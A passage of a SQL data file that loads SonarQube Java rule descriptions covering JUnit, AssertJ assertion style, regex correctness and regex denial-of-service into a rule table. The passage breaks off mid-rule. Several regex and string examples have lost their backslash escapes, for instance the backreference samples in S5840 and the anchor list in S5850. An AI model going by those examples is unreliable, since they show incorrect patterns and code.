<pre>
@Before
public void setUp() { ... }

@After
public void tearDown() { ... }
</pre>
<ul>
  <li> JUnit5: </li>
</ul>
<pre>
@BeforeEach
void setUp() { ... }

@AfterEach
void tearDown() { ... }
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5831', 'AssertJ configuration should be applied', 'sonarqube', 'Bug', '<p>A <code>org.assertj.core.configuration.Configuration</code> will be effective only once you call <code>Configuration.apply()</code> or
<code>Configuration.applyAndDisplay()</code>.</p>
<p>This rule raises an issue when configurations are set without the appropriate call to apply them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Configuration configuration = new Configuration(); // Noncompliant, this configuration will not be applied.
configuration.setComparingPrivateFields(true);{code}
</pre>
<h2>Compliant Solution</h2>
<pre>
Configuration configuration = new Configuration();
configuration.setComparingPrivateFields(true);
configuration.applyAndDisplay();
// Alternatively: configuration.apply();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://assertj.github.io/doc/#assertj-configuration">AssertJ configuration documentation</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5833', 'AssertJ methods setting the assertion context should come before an assertion', 'sonarqube', 'Bug', '<p>Describing, setting error message or adding a comparator in <a href="https://assertj.github.io/doc/">AssertJ</a> must be done before calling the
assertion, otherwise, settings will not be taken into account.</p>
<p>This rule raises an issue when one of the method (with all similar methods):</p>
<ul>
  <li> <code>as</code> </li>
  <li> <code>describedAs</code> </li>
  <li> <code>withFailMessage</code> </li>
  <li> <code>overridingErrorMessage</code> </li>
  <li> <code>usingComparator</code> </li>
  <li> <code>usingElementComparator</code> </li>
  <li> <code>extracting</code> </li>
  <li> <code>filteredOn</code> </li>
</ul>
<p>is called without calling an AssertJ assertion afterward.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertThat(actual).isEqualTo(expected).as("Description"); // Noncompliant
assertThat(actual).isEqualTo(expected).withFailMessage("Fail message"); // Noncompliant
assertThat(actual).isEqualTo(expected).usingComparator(new CustomComparator()); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
assertThat(actual).as("Description").isEqualTo(expected);
assertThat(actual).withFailMessage("Fail message").isEqualTo(expected);
assertThat(actual).usingComparator(new CustomComparator()).isEqualTo(expected);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://assertj.github.io/doc/#calling-as-after-the-assertion">AssertJ incorrect usage documentation</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5838', 'Chained AssertJ assertions should be simplified to the corresponding dedicated assertion', 'sonarqube', 'Code Smell', '<p>AssertJ contains many assertions methods specific to common types. Both versions will test the same things, but the dedicated one will provide a
better error message, simplifying the debugging process.</p>
<p>This rule reports an issue when an assertion can be simplified to a dedicated one.</p>
<p>The array below gives a non-exhaustive list of assertion reported by the rule. Code behaving similarly, or with a negation will also be
reported.</p>
<table>
  <tbody>
    <tr>
      <th>Original</th>
      <th>Dedicated</th>
    </tr>
    <tr>
      <th>&nbsp;Related to Object</th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getObject()).isEqualTo(null)</code></td>
      <td><code>assertThat(getObject()).isNull()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getBoolean()).isEqualTo(true)</code></td>
      <td><code>assertThat(getBoolean()).isTrue()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getBoolean()).isEqualTo(false)</code></td>
      <td><code>assertThat(getBoolean()).isFalse()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x.equals(y)).isTrue()</code></td>
      <td><code>assertThat(x).isEqualTo(y)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x == y).isTrue()</code></td>
      <td><code>assertThat(x).isSameAs(y)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x == null).isTrue()</code></td>
      <td><code>assertThat(x).isNull()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x.toString()).isEqualTo(y)</code></td>
      <td><code>assertThat(x).hasToString(y)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x.hashCode()).isEqualTo(y.hashCode())</code></td>
      <td><code>assertThat(x).hasSameHashCodeAs(y));</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getObject() instanceof MyClass).isTrue()</code></td>
      <td><code>assertThat(getObject()).isInstanceOf(MyClass.class)</code></td>
    </tr>
    <tr>
      <th>Related to <code>Comparable</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(x.compareTo(y)).isZero()</code></td>
      <td><code>assertThat(x).isEqualByComparingTo(y)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x &gt;= y).isGreaterThanOrEqualTo(0)</code></td>
      <td><code>assertThat(x).isGreaterThanOrEqualTo(y)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x &gt; y).isPositive()</code></td>
      <td><code>assertThat(x).isGreaterThan(y)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x &lt;= y).isNotPositive()</code></td>
      <td><code>assertThat(x).isLessThanOrEqualTo(y)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(x &lt; y).isTrue()</code></td>
      <td><code>assertThat(x).isLessThan(y)</code></td>
    </tr>
    <tr>
      <th>Related to <code>String</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getString().isEmpty()).isTrue()</code></td>
      <td><code>assertThat(getString()).isEmpty()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(</code><code>getString</code><code>()).hasSize(0)</code></td>
      <td><code>assertThat(</code><code>getString</code><code>()).isEmpty()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().equals(expected)).isTrue()</code></td>
      <td><code>assertThat(getString()).isEqualTo(expected)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().equalsIgnoreCase(expected)).isTrue()</code></td>
      <td><code>assertThat(getString()).isEqualToIgnoringCase(expected)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().contains(expected)).isTrue()</code></td>
      <td><code>assertThat(getString()).contains(expected)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().startsWith(expected)).isTrue()</code></td>
      <td><code>assertThat(getString()).startsWith(expected)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().endsWith(expected)).isTrue()</code></td>
      <td><code>assertThat(getString()).endsWith(expected)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().matches(expected)).isTrue()</code></td>
      <td><code>assertThat(getString()).matches(expected)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().trim()).isEmpty()</code></td>
      <td><code>assertThat(getString()).isBlank()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().length()).isEqualTo(length)</code></td>
      <td><code>assertThat(getString()).hasSize(length)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getString().length()).hasSize(expected.length())</code></td>
      <td><code>assertThat(getString()).hasSameSizeAs(expected)</code></td>
    </tr>
    <tr>
      <th>&nbsp;Related to <code>File</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getFile()).hasSize(0)</code></td>
      <td><code>assertThat(getFile()).isEmpty()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().length()).isZero()</code></td>
      <td><code>assertThat(getFile()).isEmpty()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().length()).isEqualTo(length)</code></td>
      <td><code>assertThat(getFile()).hasSize(length)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().canRead()).isTrue()</code></td>
      <td><code>assertThat(getFile()).canRead()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().canWrite()).isTrue()</code></td>
      <td><code>assertThat(getFile()).canWrite()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().exists()).isTrue()</code></td>
      <td><code>assertThat(getFile()).exists()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().getName()).isEqualTo(name)</code></td>
      <td><code>assertThat(getFile()).hasName(name)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().getParent()).isEqualTo(pathname)</code></td>
      <td><code>assertThat(getFile()).hasParent(pathname)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().getParentFile()).isNull()</code></td>
      <td><code>assertThat(getFile()).hasNoParent()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().isAbsolute()).isTrue()</code></td>
      <td><code>assertThat(getFile()).isAbsolute()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().isAbsolute()).isFalse()</code></td>
      <td><code>assertThat(getFile()).isRelative()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().isDirectory()).isTrue()</code></td>
      <td><code>assertThat(getFile()).isDirectory()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().isFile()).isTrue()</code></td>
      <td><code>assertThat(getFile()).isFile()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getFile().list()).isEmpty()</code></td>
      <td><code>assertThat(getFile()).isEmptyDirectory()</code></td>
    </tr>
    <tr>
      <th>&nbsp;Related to <code>Path</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getPath().startsWith(path)).isTrue()</code></td>
      <td><code>assertThat(getPath()).startsWithRaw(path)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getPath().endsWith(path)).isTrue()</code></td>
      <td><code>assertThat(getPath()).endsWithRaw(path)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getPath().getParent()).isEqualTo(name)</code></td>
      <td><code>assertThat(getPath()).hasParentRaw(name)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getPath().getParent()).isNull()</code></td>
      <td><code>assertThat(getPath()).hasNoParentRaw()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getPath().isAbsolute()).isTrue()</code></td>
      <td><code>assertThat(getPath()).isAbsolute()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getPath().isAbsolute()).isFalse()</code></td>
      <td><code>assertThat(getPath()).isRelative()</code></td>
    </tr>
    <tr>
      <th>&nbsp;Related to <code>Array</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getArray().length).isZero()</code></td>
      <td><code>assertThat(getArray()).isEmpty()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getArray().length).isEqualTo(length)</code></td>
      <td><code>assertThat(getArray()).hasSize(length)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getArray().length).isEqualTo(anotherArray.length)</code></td>
      <td><code>assertThat(getArray()).hasSameSizeAs(getAnotherArray())</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getArray().length).isLessThanOrEqualTo(expression)</code></td>
      <td><code>assertThat(getArray()).hasSizeLessThanOrEqualTo(expression)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getArray().length).isLessThan(expression)</code></td>
      <td><code>assertThat(getArray()).hasSizeLessThan(expression)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getArray().length).isGreaterThan(expression)</code></td>
      <td><code>assertThat(getArray()).hasSizeGreaterThan(expression)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getArray().length).isGreaterThanOrEqualTo(expression)</code></td>
      <td><code>assertThat(getArray()).hasSizeGreaterThanOrEqualTo(expression)</code></td>
    </tr>
    <tr>
      <th>&nbsp;Related to <code>Collection</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getCollection().isEmpty()).isTrue()</code></td>
      <td><code>assertThat(getCollection()).isEmpty()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getCollection().size()).isZero()</code></td>
      <td><code>assertThat(getCollection()).isEmpty()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getCollection().contains(something)).isTrue()</code></td>
      <td><code>assertThat(getCollection()).contains(something)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getCollection().containsAll(otherCollection)).isTrue()</code></td>
      <td><code>assertThat(getCollection()).containsAll(otherCollection)</code></td>
    </tr>
    <tr>
      <th>&nbsp;Related to <code>Map</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getMap().size()).isEqualTo(otherMap().size()</code></td>
      <td><code>assertThat(getMap()).hasSameSizeAs(otherMap())</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getMap().containsKey(key)).isTrue()</code></td>
      <td><code>assertThat(getMap()).containsKey(key)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getMap().keySet()).contains(key)</code></td>
      <td><code>assertThat(getMap()).containsKey(key)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getMap().keySet()).containsOnlyKey(key)</code></td>
      <td><code>assertThat(getMap()).containsOnlyKey(key)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getMap().containsValue(value)).isTrue()</code></td>
      <td><code>assertThat(getMap()).containsValue(value)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getMap().values()).contains(value)</code></td>
      <td><code>assertThat(getMap()).containsValue(</code><code>value</code><code>)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getMap().get(key)).isEqualTo(value)</code></td>
      <td><code>assertThat(getMap()).containsEntry(key, value)</code></td>
    </tr>
    <tr>
      <th>Related to <code>Optional</code></th>
      <th>&nbsp;</th>
    </tr>
    <tr>
      <td><code>assertThat(getOptional().isPresent()).isTrue()</code></td>
      <td><code>assertThat(getOptional()).isPresent()</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getOptional().get()).isEqualTo(something)</code></td>
      <td><code>assertThat(getOptional()).contains(something)</code></td>
    </tr>
    <tr>
      <td><code>assertThat(getOptional().get()).isSameAs(something)</code></td>
      <td><code>assertThat(getOptional()).containsSame(something)</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
assertThat(getObject()).isEqualTo(null); // Noncompliant
assertThat(getObject()).isNotEqualTo(null); // Noncompliant - not listed above but also supported

assertThat(getString().trim()).isEmpty();
assertThat(getFile().canRead()).isTrue();
assertThat(getPath().getParent()).isNull();
</pre>
<h2>Compliant Solution</h2>
<pre>
assertThat(getObject()).isNull();

assertThat(getString()).isBlank();
assertThat(getFile()).canRead();
assertThat(getPath()).hasNoParentRaw();
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5840', 'Regex patterns and their sub-patterns should not always fail', 'sonarqube', 'Bug', '<p>Using certain features of regular expressions, it is possible to create regular expressions that can never match or contain subpatterns that can
never match. Since a pattern or sub-pattern that can never match any input is pointless, this is a sign that the pattern does not work as intended and
needs to be fixed.</p>
<p>This rule finds some such regular expressions and subpatterns, specifically ones that meet one of the following conditions:</p>
<ul>
  <li> Beginning- and end-of-line/input boundaries appearing in a position where they can never match (e.g. an end-of-input marker being followed by
  other characters) </li>
  <li> A back reference refers to a capturing group that will never be matched before the back reference </li>
</ul>
<h2>Noncompliant Code Example</h2>
<h3>Boundaries</h3>
<pre>
$[a-z]*^
</pre>
<h3>Backreference</h3>
<pre>
1(.)
</pre>
<h2>Compliant Solution</h2>
<h3>Boundaries</h3>
<pre>
^[a-z]*$
</pre>
<h3>Backreference</h3>
<pre>
(.)1
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5996''>S5996</a>, <a href=''/coding_rules#rule_key=java%3AS6001''>S6001</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5841', 'AssertJ assertions "allMatch" and "doesNotContains" should also test for emptiness', 'sonarqube', 'Bug', '<p>AssertJ assertions <code>allMatch</code> and <code>doesNotContains</code> on an empty list always&nbsp;returns true whatever the content of the
predicate. Despite being correct, you should make explicit if you expect an empty list or not, by adding
<code>isEmpty()</code>/<code>isNotEmpty()</code> in addition to calling the assertion, or by testing the list''s content further. It will justify the
useless predicate to improve clarity or increase the reliability of the test.</p>
<p>This rule raises an issue when any of the methods listed are used without asserting that the list is empty or not and without testing the
content.</p>
<p>Targetted methods:</p>
<ul>
  <li> <code>allMatch</code> </li>
  <li> <code>allSatisfy</code> </li>
  <li> <code>doesNotContain</code> </li>
  <li> <code>doesNotContainSequence</code> </li>
  <li> <code>doesNotContainSubsequence</code> </li>
  <li> <code>doesNotContainAnyElementsOf</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; logs = getLogs();

assertThat(logs).allMatch(e -&gt; e.contains(“error”)); // Noncompliant, this test pass if logs are empty!
assertThat(logs).doesNotContain("error"); // Noncompliant, do you expect any log?
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; logs = getLogs();

assertThat(logs).isNotEmpty().allMatch(e -&gt; e.contains(“error”));
// Or
assertThat(logs).hasSize(5).allMatch(e -&gt; e.contains(“error”));
// Or
assertThat(logs).isEmpty();

// Despite being redundant, this is also acceptable since it explains why you expect an empty list
assertThat(logs).doesNotContain("error").isEmpty();
// or test the content of the list further
assertThat(logs).contains("warning").doesNotContain("error");
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5842', 'Regex repetition pattern''s body should not match the empty String', 'sonarqube', 'Bug', '<p>A regex should never include a repetitive pattern whose body would match the empty String. This is usually a sign that a part of the regex is
redundant or does not do what the author intended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
"(?:)*"      // same as the empty regex, the ''*'' accomplishes nothing
"(?:|x)*"    // same as the empty regex, the alternative has no effect
"(?:x|)*"    // same as ''x*'', the empty alternative has no effect
"(?:x*|y*)*" // same as ''x*'', the first alternative would always match, y* is never tried
"(?:x?)*"    // same as ''x*''
"(?:x?)+"    // same as ''x*''
</pre>
<h2>Compliant Solution</h2>
<pre>
"x*"
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5843', 'Regular expressions should not be too complicated', 'sonarqube', 'Code Smell', '<p>Overly complicated regular expressions are hard to read and to maintain and can easily cause hard-to-find bugs. If a regex is too complicated, you
should consider replacing it or parts of it with regular code or splitting it apart into multiple patterns at least.</p>
<p>The complexity of a regular expression is determined as follows:</p>
<p>Each of the following operators increases the complexity by an amount equal to the current nesting level and also increases the current nesting
level by one for its arguments:</p>
<ul>
  <li> <code>|</code> - when multiple <code>|</code> operators are used together, the subsequent ones only increase the complexity by 1 </li>
  <li> <code>&amp;&amp;</code> (inside character classes) - when multiple <code>&amp;&amp;</code> operators are used together, the subsequent ones
  only increase the complexity by 1 </li>
  <li> Quantifiers (<code>*</code>, <code>+</code>, <code>?</code>, <code>{n,m}</code>, <code>{n,}</code> or <code>{n}</code>) </li>
  <li> Non-capturing groups that set flags (such as <code>(?i:some_pattern)</code> or <code>(?i)some_pattern</code>) </li>
  <li> Lookahead and lookbehind assertions </li>
</ul>
<p>Additionally, each use of the following features increase the complexity by 1 regardless of nesting:</p>
<ul>
  <li> character classes </li>
  <li> back references </li>
</ul>
<p>If a regular expression is split among multiple variables, the complexity is calculated for each variable individually, not for the whole regular
expression. If a regular expression is split over multiple lines, each line is treated individually if it is accompanied by a comment (either a Java
comment or a comment within the regular expression), otherwise the regular expression is analyzed as a whole.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (dateString.matches("^(?:(?:31(/|-|\\.)(?:0?[13578]|1[02]))\\1|(?:(?:29|30)(/|-|\\.)(?:0?[13-9]|1[0-2])\\2))(?:(?:1[6-9]|[2-9]\\d)?\\d{2})$|^(?:29(/|-|\\.)0?2\\3(?:(?:(?:1[6-9]|[2-9]\\d)?(?:0[48]|[2468][048]|[13579][26])|(?:(?:16|[2468][048]|[3579][26])00))))$|^(?:0?[1-9]|1\\d|2[0-8])(/|-|\\.)(?:(?:0?[1-9])|(?:1[0-2]))\\4(?:(?:1[6-9]|[2-9]\\d)?\\d{2})$")) {
    handleDate(dateString);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
    if (dateString.matches("^\\d{1,2}([-/.])\\d{1,2}\\1\\d{1,4}$")) {
        String dateParts[] = dateString.split("[-/.]");
        int day = Integer.parseInt(dateParts[0]);
        int month = Integer.parseInt(dateParts[1]);
        int year = Integer.parseInt(dateParts[2]);
        // Put logic to validate and process the date based on its integer parts here
    }
</pre>
<h2>Exceptions</h2>
<p>Regular expressions are only analyzed if all parts of the regular expression are either string literals, effectively final local variables or
<code>static final</code> fields, all of which can be combined using the ''<code>+</code>'' operator.</p>
<p>When a regular expression is split among multiple variables or commented lines, each part is only analyzed if it is syntactically valid by
itself.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5845', 'Assertions comparing incompatible types should not be made', 'sonarqube', 'Bug', '<p>Assertions comparing incompatible types always fail, and negative assertions always pass. At best, negative assertions are useless. At worst, the
developer loses time trying to fix his code logic before noticing wrong assertions.</p>
<p>Dissimilar types are:</p>
<ul>
  <li> comparing a primitive with null </li>
  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>
  <li> comparing unrelated classes </li>
  <li> comparing an array to a non-array </li>
  <li> comparing two arrays of dissimilar types </li>
</ul>
<p>This rule also raises issues for unrelated <code>class</code> and <code>interface</code> or unrelated <code>interface</code> types in negative
assertions. Because except in some corner cases, those types are more likely to be dissimilar. And inside a negative assertion, there is no test
failure to inform the developer about this unusual comparison.</p>
<p>Supported test frameworks:</p>
<ul>
  <li> JUnit4 </li>
  <li> JUnit5 </li>
  <li> AssertJ </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
interface KitchenTool {}
interface Plant {}
class Spatula implements KitchenTool {}
class Tree implements Plant {}

void assertValues(int size,
                  Spatula spatula, KitchenTool tool,  KitchenTool[] tools,
                  Tree    tree,    Plant       plant, Tree[]        trees) {

  // Whatever the given values, those negative assertions will always pass due to dissimilar types:
  assertThat(size).isNotNull();           // Noncompliant; primitives can not be null
  assertThat(spatula).isNotEqualTo(tree); // Noncompliant; unrelated classes
  assertThat(tool).isNotSameAs(tools);    // Noncompliant; array &amp; non-array
  assertThat(trees).isNotEqualTo(tools);  // Noncompliant; incompatible arrays

  // Those assertions will always fail
  assertThat(size).isNull();                       // Noncompliant
  assertThat(spatula).isEqualTo(tree);             // Noncompliant

  // Those negative assertions are more likely to always pass
  assertThat(spatula).isNotEqualTo(plant); // Noncompliant; unrelated class and interface
  assertThat(tool).isNotEqualTo(plant);    // Noncompliant; unrelated interfaces
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS2159''>S2159</a> - Silly equality checks should not be made </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5846', 'Empty lines should not be tested with regex MULTILINE flag', 'sonarqube', 'Code Smell', '<p>One way to test for empty lines is to use the regex <code>"^$"</code>, which can be extremely handy when filtering out empty lines from collections
of Strings, for instance. With regard to this, the Javadoc for <a
href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/regex/Pattern.html">Pattern (Line Terminators)</a> states the
following:</p>
<blockquote>
  <p>By default, the regular expressions ^ and <code>$</code> ignore line terminators and only match at the beginning and the end, respectively, of
  the entire input sequence. If <code>MULTILINE</code> mode is activated then ^ matches at the beginning of input and after any line terminator
  <strong>except at the end of input</strong>. When in <code>MULTILINE</code> mode <code>$</code> matches just before a line terminator or the end of
  the input sequence.</p>
</blockquote>
<p>As emphasized, ^ is not going to match at the end of an input, and the end of the input is necessarily included in the empty string, which might
lead to completely missing empty lines, while it would be the initial reason for using such regex.</p>
<p>Therefore, when searching for empty lines using a multi-line regular expression, you should also check whether the string is empty.</p>
<p>This rule is raising an issue every time a pattern that can match the empty string is used with <code>MULTILINE</code> flag and without calling
<code>isEmpty()</code> on the string.</p>
<h2>Noncompliant Code Example</h2>
<pre>
static final Pattern p = Pattern.compile("^$", Pattern.MULTILINE); // Noncompliant

// Alternatively
static final Pattern p = Pattern.compile("(?m)^$"); // Noncompliant


boolean containsEmptyLines(String str) {
    return p.matcher(str).find();
}

// ...
System.out.println(containsEmptyLines("a

b")); // correctly prints ''true''
System.out.println(containsEmptyLines("")); // incorrectly prints ''false''
</pre>
<h2>Compliant Solution</h2>
<pre>
static final Pattern p = Pattern.compile("^$", Pattern.MULTILINE);

boolean containsEmptyLines(String str) {
    return p.matcher(str).find() || str.isEmpty();
}

// ...
System.out.println(containsEmptyLines("a

b")); // correctly prints ''true''
System.out.println(containsEmptyLines("")); // also correctly prints ''true''
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5850', 'Alternatives in regular expressions should be grouped when used with anchors', 'sonarqube', 'Bug', '<p>In regular expressions, anchors (<code>^</code>, <code>$</code>, <code>A</code>, <code></code> and <code>z</code>) have higher precedence than
the <code>|</code> operator. So in a regular expression like <code>^alt1|alt2|alt3$</code>, <code>alt1</code> would be anchored to the beginning,
<code>alt3</code> to the end and <code>alt2</code> wouldn''t be anchored at all. Usually the intended behavior is that all alternatives are anchored at
both ends. To achieve this, a non-capturing group should be used around the alternatives.</p>
<p>In cases where it is intended that the anchors only apply to one alternative each, adding (non-capturing) groups around the anchors and the parts
that they apply to will make it explicit which parts are anchored and avoid readers misunderstanding the precedence or changing it because they
mistakenly assume the precedence was not intended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
^a|b|c$
</pre>
<h2>Compliant Solution</h2>
<pre>
^(?:a|b|c)$
</pre>
<p>or</p>
<pre>
^a$|^b$|^c$
</pre>
<p>or, if you do want the anchors to only apply to <code>a</code> and <code>c</code> respectively:</p>
<pre>
(?:^a)|b|(?:c$)
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5852', 'Using slow regular expressions is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating
an input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity
of the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger
<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too
with, in this case, a large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>
<p>Note that, due to improvements to the matching algorithm, some cases of exponential runtime complexity have become impossible when run using JDK 9
or later. In such cases, an issue will only be reported if the project''s target Java version is 8 or earlier.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The input is user-controlled. </li>
  <li> The input size is not restricted to a small number of characters. </li>
  <li> There is no timeout in place to limit the regex evaluation time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>String.matches</code>), the end of the
regex counts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>
<ul>
  <li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different
  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if
  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there''s only
  one way to match it).
    <ul>
      <li> When using JDK 9 or later an optimization applies when the repetition is greedy and the entire regex does not contain any back references.
      In that case the runtime will only be polynomial (in case of nested repetitions) or even linear (in case of alternations or optional parts).
      </li>
    </ul> </li>
  <li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional
  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the
  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different
  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a ''_'' and can''t match that ''_''. However, <code>a*a*</code>
  and <code>.*_.*</code> have quadratic runtime. </li>
  <li> If you''re performing a partial match (such as by using <code>Matcher.find</code>, <code>String.split</code>, <code>String.replaceAll</code>
  etc.) and the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails,
  the regex engine will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if it''s followed by a
  pattern that can fail, can cause quadratic runtime on some inputs. For example <code>str.split("\\s*,")</code> will run in quadratic time on strings
  that consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li>
</ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul>
  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>
  for instance. </li>
  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this
  nested quantifier situation <code>(ba+)+</code> doesn''t cause performance issues, indeed, the inner group can be matched only if there exists
